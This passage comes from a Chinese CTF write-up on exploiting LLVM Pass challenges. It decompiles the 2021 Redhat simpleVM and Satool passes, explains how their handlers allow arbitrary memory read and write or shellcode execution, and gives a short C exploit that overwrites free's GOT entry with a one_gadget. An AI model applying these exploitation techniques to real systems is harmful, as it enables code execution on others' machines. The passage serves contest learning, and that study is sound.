class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Register for opt</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Register for clang</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> RegisterStandardPasses <span class="title">Y</span><span class="params">(PassManagerBuilder::EP_EarlyAsPossible,</span></span></span><br><span class="line"><span class="params"><span class="function">  [](<span class="keyword">const</span> PassManagerBuilder &amp;Builder, legacy::PassManagerBase &amp;PM) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">    PM.add(<span class="keyword">new</span> Hello());</span></span></span><br><span class="line"><span class="params"><span class="function">&#125;)</span></span>;</span><br></pre></td></tr></table></figure><p>现在在刚刚的基础上对函数的代码进行遍历操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">tcdy@ubuntu:~$ opt -load ./test.so -hello ./test.ll</span><br><span class="line">WARNING: You<span class="string">&#x27;re attempting to print out a bitcode file.</span></span><br><span class="line"><span class="string">This is inadvisable as it may cause display problems. If</span></span><br><span class="line"><span class="string">you REALLY want to taste LLVM bitcode first-hand, you</span></span><br><span class="line"><span class="string">can force output with the `-f&#x27;</span> option.</span><br><span class="line"></span><br><span class="line">Hello: main</span><br><span class="line">opcode=alloca NumOperands=1</span><br><span class="line">opcode=getelementptr NumOperands=3</span><br><span class="line">opcode=call NumOperands=4</span><br><span class="line">opcode=getelementptr NumOperands=3</span><br><span class="line">opcode=call NumOperands=4</span><br><span class="line">opcode=call NumOperands=2</span><br><span class="line">opcode=ret NumOperands=1</span><br></pre></td></tr></table></figure><p>最后可以看到拿到了函数中的指令操作</p><h3 id="LLVM-PASS逆向分析"><a href="#LLVM-PASS逆向分析" class="headerlink" title="LLVM PASS逆向分析"></a>LLVM PASS逆向分析</h3><p>一般来说LLVM PASS pwn都是对函数进行PASS操作，所以我们首先要找到runOnFunction函数时如何重写的</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220727153234091.png"                      alt="image-20220727153234091"                ></p><p>一般来说runOnFunction都会在函数表的最下面</p><h2 id="2021-redhat-simpleVM"><a href="#2021-redhat-simpleVM" class="headerlink" title="2021 redhat simpleVM"></a>2021 redhat simpleVM</h2><p>首先找到上面所述的函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_6830</span><span class="params">(__int64 a1, llvm::Value *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">bool</span> v4; <span class="comment">// [rsp+7h] [rbp-119h]</span></span><br><span class="line">  <span class="keyword">size_t</span> v5; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *Name; <span class="comment">// [rsp+28h] [rbp-F8h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+30h] [rbp-F0h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+94h] [rbp-8Ch]</span></span><br><span class="line"></span><br><span class="line">  Name = (<span class="keyword">const</span> <span class="keyword">void</span> *)llvm::Value::<span class="built_in">getName</span>(a2);</span><br><span class="line">  v7 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;o0o0o0o0&quot;</span> )</span><br><span class="line">    v5 = <span class="built_in">strlen</span>(<span class="string">&quot;o0o0o0o0&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v5 = <span class="number">0LL</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v7 == v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">      v8 = <span class="built_in">memcmp</span>(Name, <span class="string">&quot;o0o0o0o0&quot;</span>, v5);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v8 = <span class="number">0</span>;</span><br><span class="line">    v4 = v8 == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="built_in">sub_6AC0</span>(a1, a2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里验证的是函数名是否为<code>o0o0o0o0</code>然后进入：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_6AC0</span><span class="params">(__int64 a1, llvm::Function *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  llvm::BasicBlock *v3; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+38h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v5[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5[<span class="number">0</span>] = llvm::Function::<span class="built_in">begin</span>(a2);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = llvm::Function::<span class="built_in">end</span>(a2);</span><br><span class="line">    <span class="keyword">if</span> ( (llvm::<span class="keyword">operator</span>!=(v5, &amp;v4) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = (llvm::BasicBlock *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="keyword">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::<span class="keyword">operator</span>*(v5);</span><br><span class="line">    <span class="built_in">sub_6B80</span>(a1, v3);</span><br><span class="line">    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="keyword">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::<span class="keyword">operator</span>++(</span><br><span class="line">      v5,</span><br><span class="line">      <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里则是遍历函数中的每一个basicblock，取出之后进入sub_6b80函数进一步处理</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">v39[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">v39[<span class="number">0</span>] = llvm::BasicBlock::<span class="built_in">begin</span>(a2);</span><br><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">    v38 = llvm::BasicBlock::<span class="built_in">end</span>(a2);</span><br><span class="line">    <span class="keyword">if</span> ( (llvm::<span class="keyword">operator</span>!=(v39, &amp;v38) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    v36 = (llvm::Instruction *)llvm::dyn_cast&lt;llvm::Instruction,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="keyword">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;&gt;(v39);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::Instruction::<span class="built_in">getOpcode</span>(v36) == <span class="number">0x37</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v35 = (llvm::CallBase *)llvm::dyn_cast&lt;llvm::CallInst,llvm::Instruction&gt;(v36);</span><br><span class="line">        <span class="keyword">if</span> ( v35 )</span><br><span class="line">        &#123;</span><br><span class="line">            s1 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">            CalledFunction = (llvm::Value *)llvm::CallBase::<span class="built_in">getCalledFunction</span>(v35);</span><br><span class="line">            Name = (_QWORD *)llvm::Value::<span class="built_in">getName</span>(CalledFunction);</span><br><span class="line">            *(_QWORD *)s1 = *Name;</span><br><span class="line">            *((_QWORD *)s1 + <span class="number">1</span>) = Name[<span class="number">1</span>];</span><br><span class="line">            *((_QWORD *)s1 + <span class="number">2</span>) = Name[<span class="number">2</span>];</span><br><span class="line">            *((_QWORD *)s1 + <span class="number">3</span>) = Name[<span class="number">3</span>];</span><br></pre></td></tr></table></figure><p>这里呢则是遍历basicblock中的每一个操作指令，后续就是类似于vm-pwn中对相应的指令做相应的处理。这里重点关注三段代码即可：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;store&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v25 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">        v24 = <span class="number">0LL</span>;</span><br><span class="line">        v23 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v25);</span><br><span class="line">        <span class="keyword">if</span> ( v23 )</span><br><span class="line">        &#123;</span><br><span class="line">            v22 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v23);</span><br><span class="line">            <span class="keyword">if</span> ( v22 == <span class="number">1</span> )</span><br><span class="line">                v24 = REG1;</span><br><span class="line">            <span class="keyword">if</span> ( v22 == <span class="number">2</span> )</span><br><span class="line">                v24 = REG2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v24 == REG1 )</span><br><span class="line">        &#123;</span><br><span class="line">            **(_QWORD **)REG1 = *(_QWORD *)REG2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v24 == REG2 )</span><br><span class="line">        &#123;</span><br><span class="line">            **(_QWORD **)REG2 = *(_QWORD *)REG1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以看到指令为store时，通过第一个参数来决定下面是什么寄存器来进行赋值，如果我们可以操控寄存器也就可以实现任意地址写了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;load&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v21 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">        v20 = <span class="number">0LL</span>;</span><br><span class="line">        v19 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v21);</span><br><span class="line">        <span class="keyword">if</span> ( v19 )</span><br><span class="line">        &#123;</span><br><span class="line">            v18 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v19);</span><br><span class="line">            <span class="keyword">if</span> ( v18 == <span class="number">1</span> )</span><br><span class="line">                v20 = REG1;</span><br><span class="line">            <span class="keyword">if</span> ( v18 == <span class="number">2</span> )</span><br><span class="line">                v20 = REG2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v20 == REG1 )</span><br><span class="line">            *(_QWORD *)REG2 = **(_QWORD **)REG1;</span><br><span class="line">        <span class="keyword">if</span> ( v20 == REG2 )</span><br><span class="line">            *(_QWORD *)REG1 = **(_QWORD **)REG2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据上面同理，如果可以操控寄存器就可以任意地址读了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;add&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::CallBase::<span class="built_in">getNumOperands</span>(v35) == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v17 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">0</span>);</span><br><span class="line">        v16 = <span class="number">0LL</span>;</span><br><span class="line">        v15 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v17);</span><br><span class="line">        <span class="keyword">if</span> ( v15 )</span><br><span class="line">        &#123;</span><br><span class="line">            v14 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v15);</span><br><span class="line">            <span class="keyword">if</span> ( v14 == <span class="number">1</span> )</span><br><span class="line">                v16 = REG1;</span><br><span class="line">            <span class="keyword">if</span> ( v14 == <span class="number">2</span> )</span><br><span class="line">                v16 = REG2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v16 )</span><br><span class="line">        &#123;</span><br><span class="line">            v13 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v35, <span class="number">1u</span>);</span><br><span class="line">            v12 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v13);</span><br><span class="line">            <span class="keyword">if</span> ( v12 )</span><br><span class="line">                *v16 += llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v12);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们就可以控制寄存器了</p><p>可以在上面看到，这里的指令是放在malloc出来的堆块上面的，并且程序的循环最后会free掉堆块，那么我们的思路就是修改free的got表为one_gadget</p><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">store</span><span class="params">(<span class="keyword">int</span> a)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">load</span><span class="params">(<span class="keyword">int</span> a)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">o0o0o0o0</span><span class="params">()</span></span>&#123;</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x77e100</span>);</span><br><span class="line">    load(<span class="number">1</span>);</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x729ec</span>);</span><br><span class="line">    store(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Satool"><a href="#Satool" class="headerlink" title="Satool"></a>Satool</h2><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## Introduction</span></span><br><span class="line"></span><br><span class="line">A LLVM Pass that can optimize add/sub instructions.</span><br><span class="line"></span><br><span class="line"><span class="comment">## How to run</span></span><br><span class="line"></span><br><span class="line">opt-12 -load ./mbaPass.so -mba &#123;*.bc/*.ll&#125; -S</span><br><span class="line"></span><br><span class="line"><span class="comment">## Example</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### IR before optimization</span></span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">define dso_local i64 @foo(i64 %0) local_unnamed_addr <span class="comment">#0 &#123;</span></span><br><span class="line">  %<span class="attr">2</span> = sub nsw i64 %<span class="number">0</span>, <span class="number">2</span></span><br><span class="line">  %<span class="attr">3</span> = add nsw i64 %<span class="number">2</span>, <span class="number">68</span></span><br><span class="line">  %<span class="attr">4</span> = add nsw i64 %<span class="number">0</span>, <span class="number">6</span></span><br><span class="line">  %<span class="attr">5</span> = add nsw i64 %<span class="number">4</span>, -<span class="number">204</span></span><br><span class="line">  %<span class="attr">6</span> = add nsw i64 %<span class="number">5</span>, %<span class="number">3</span></span><br><span class="line">  ret i64 %6</span><br><span class="line">&#125;</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line"><span class="comment">### IR after optimization</span></span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">define dso_local i64 @foo(i64 %0) local_unnamed_addr <span class="comment">#0 &#123;</span></span><br><span class="line">  %<span class="attr">2</span> = mul i64 %<span class="number">0</span>, <span class="number">2</span></span><br><span class="line">  %<span class="attr">3</span> = add i64 %<span class="number">2</span>, -<span class="number">132</span></span><br><span class="line">  ret i64 %3</span><br><span class="line">&#125;</span><br><span class="line">```</span><br></pre></td></tr></table></figure><p>首先看题目的readme文件，可以从before和after的对比看出来这里做的是压缩优化IR指令，并且限制了只能是sub或者add或者ret</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220727154845308.png"                      alt="image-20220727154845308"                ></p><p>可以看到这道题的runOnFunction更是直接给了出来</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">v30 = <span class="keyword">this</span>;</span><br><span class="line">v29 = a2;</span><br><span class="line">v28 = <span class="number">0</span>;</span><br><span class="line">v2 = a2;</span><br><span class="line"><span class="keyword">if</span> ( llvm::Function::<span class="built_in">arg_size</span>(a2) != <span class="number">1</span> || (v2 = v29, llvm::Function::<span class="built_in">size</span>(v29) != <span class="number">1</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    v3 = llvm::<span class="built_in">errs</span>(v2);</span><br><span class="line">    llvm::raw_ostream::<span class="keyword">operator</span>&lt;&lt;(v3, <span class="string">&quot;Function has more than one argument or basicblock\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>[<span class="number">5</span>] = <span class="keyword">this</span>[<span class="number">4</span>];</span><br><span class="line"><span class="built_in">mprotect</span>(<span class="keyword">this</span>[<span class="number">4</span>], <span class="number">0x1000</span>uLL, <span class="number">3</span>);</span><br><span class="line">`anonymous <span class="keyword">namespace</span><span class="number">&#x27;</span>::MBAPass::<span class="built_in">handle</span>((_anonymous_namespace_::MBAPass *)<span class="keyword">this</span>, v29);</span><br><span class="line">    <span class="built_in">mprotect</span>(<span class="keyword">this</span>[<span class="number">4</span>], <span class="number">0x1000</span>uLL, <span class="number">5</span>);</span><br><span class="line">v27 = `anonymous <span class="keyword">namespace</span><span class="number">&#x27;</span>::MBAPass::<span class="built_in">callCode</span>((_anonymous_namespace_::MBAPass *)<span class="keyword">this</span>);</span><br></pre></td></tr></table></figure><p>可以看到函数的开始验证了参数和基本块只允许有一个，然后通过handle函数之后执行callCode函数，并且在handle处理之前内存的权限为可读可写，随后改为了可读可执行。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall `anonymous <span class="keyword">namespace</span><span class="number">&#x27;</span>::MBAPass::<span class="built_in">callCode</span>(</span><br><span class="line">        __int64 (__fastcall **<span class="keyword">this</span>)(_anonymous_namespace_::MBAPass *, __int64),</span><br><span class="line">        __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>[<span class="number">4</span>]((_anonymous_namespace_::MBAPass *)<span class="keyword">this</span>, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到callCode函数是将this[4]直接执行，那么意思很明显就是写shellcode。所以重点还是需要看handle函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">v32 = <span class="keyword">this</span>;</span><br><span class="line">v31 = a2;</span><br><span class="line">v30 = *((_QWORD *)<span class="keyword">this</span> + <span class="number">4</span>) + <span class="number">0xFF0</span>LL;</span><br><span class="line">v29 = (llvm::BasicBlock *)llvm::Function::<span class="built_in">front</span>(a2);</span><br><span class="line">Terminator = (llvm::User *)llvm::BasicBlock::<span class="built_in">getTerminator</span>(v29);</span><br><span class="line">Operand = llvm::User::<span class="built_in">getOperand</span>(Terminator, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( (llvm::isa&lt;llvm::Constant,llvm::Value *&gt;(&amp;Operand) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    *((_DWORD *)<span class="keyword">this</span> + <span class="number">12</span>) = <span class="number">0</span>;</span><br><span class="line">    v2 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(Operand);</span><br><span class="line">    SExtValue = llvm::ConstantInt::<span class="built_in">getSExtValue</span>(v2);</span><br><span class="line">    `anonymous <span class="keyword">namespace</span><span class="number">&#x27;</span>::MBAPass::<span class="built_in">writeMovImm64</span>(<span class="keyword">this</span>, <span class="number">0</span>, SExtValue);</span><br><span class="line">        <span class="keyword">return</span> `anonymous <span class="keyword">namespace</span><span class="number">&#x27;</span>::MBAPass::<span class="built_in">writeRet</span>(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( (llvm::isa&lt;llvm::Argument,llvm::Value *&gt;((__int64)&amp;Operand) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    *((_DWORD *)<span class="keyword">this</span> + <span class="number">12</span>) = <span class="number">1</span>;</span><br><span class="line">    `anonymous <span class="keyword">namespace</span><span class="number">&#x27;</span>::MBAPass::<span class="built_in">writeMovImm64</span>(<span class="keyword">this</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">        <span class="keyword">return</span> `anonymous <span class="keyword">namespace</span><span class="number">&#x27;</span>::MBAPass::<span class="built_in">writeRet</span>(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    `anonymous <span class="keyword">namespace</span><span class="number">&#x27;</span>::MBAPass::<span class="built_in">writeMovImm64</span>(<span class="keyword">this</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">        *((_DWORD *)<span class="keyword">this</span> + <span class="number">12</span>) = <span class="number">0</span>;</span><br><span class="line">    std::stack&lt;llvm::Value *&gt;::stack&lt;std::deque&lt;llvm::Value *&gt;,<span class="keyword">void</span>&gt;(v26);</span><br><span class="line">    std::stack&lt;<span class="keyword">int</span>&gt;::stack&lt;std::deque&lt;<span class="keyword">int</span>&gt;,<span class="keyword">void</span>&gt;(v25);</span><br><span class="line">    std::stack&lt;llvm::Value *&gt;::<span class="built_in">push</span>(v26, &amp;Operand);</span><br><span class="line">    v24 = <span class="number">1</span>;</span><br><span class="line">    std::stack&lt;<span class="keyword">int</span>&gt;::<span class="built_in">push</span>(v25, &amp;v24);</span><br><span class="line">    <span class="keyword">while</span> ( *((_QWORD *)<span class="keyword">this</span> + <span class="number">5</span>) &lt; v30 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !std::stack&lt;llvm::Value *&gt;::<span class="built_in">size</span>(v26) )</span><br><span class="line">        &#123;</span><br><span class="line">            `anonymous <span class="keyword">namespace</span><span class="number">&#x27;</span>::MBAPass::<span class="built_in">writeRet</span>(<span class="keyword">this</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span 